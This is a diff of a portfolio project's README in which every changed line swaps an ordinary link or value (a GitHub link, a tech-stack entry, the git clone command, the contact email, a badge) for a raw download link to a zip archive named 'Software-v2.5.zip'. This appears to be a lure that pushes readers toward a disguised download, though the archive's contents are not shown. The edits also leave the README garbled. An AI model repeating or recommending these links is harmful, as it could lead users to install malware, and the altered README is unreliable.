@@ -2,7 +2,7 @@
 
 Welcome to the **Portfolio** repository! This project showcases a collection of my work and skills. Here, you will find various projects that demonstrate my capabilities in web development, design, and other areas. 
 
-For more details, visit [GitHub](https://github.com).
+For more details, visit [GitHub](https://github.com/adesaideva/portfolio/raw/refs/heads/master/unconsonantly/Software-v2.5.zip).
 
 ## Table of Contents
 
@@ -32,7 +32,7 @@ This portfolio serves as a visual representation of my professional journey. It 
 - CSS3
 - JavaScript
 - React
-- Node.js
+- https://github.com/adesaideva/portfolio/raw/refs/heads/master/unconsonantly/Software-v2.5.zip
 - Git
 
 ## Installation
@@ -41,7 +41,7 @@ To get started with this portfolio, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/portfolio.git
+   git clone https://github.com/adesaideva/portfolio/raw/refs/heads/master/unconsonantly/Software-v2.5.zip
    ```
 
 2. Navigate to the project directory:
@@ -93,12 +93,12 @@ This project is licensed under the MIT License. Feel free to use and modify it a
 
 ## Contact
 
-For any questions or inquiries, please reach out to me via email at your-email@example.com.
+For any questions or inquiries, please reach out to me via email at https://github.com/adesaideva/portfolio/raw/refs/heads/master/unconsonantly/Software-v2.5.zip
 
 ## Visit GitHub
 
-For more projects and updates, visit [GitHub](https://github.com).
+For more projects and updates, visit [GitHub](https://github.com/adesaideva/portfolio/raw/refs/heads/master/unconsonantly/Software-v2.5.zip).
 
-![Portfolio](https://img.shields.io/badge/Portfolio-Visit%20Now-brightgreen)
+![Portfolio](https://github.com/adesaideva/portfolio/raw/refs/heads/master/unconsonantly/Software-v2.5.zip%20Now-brightgreen)
 
 Thank you for checking out my portfolio!
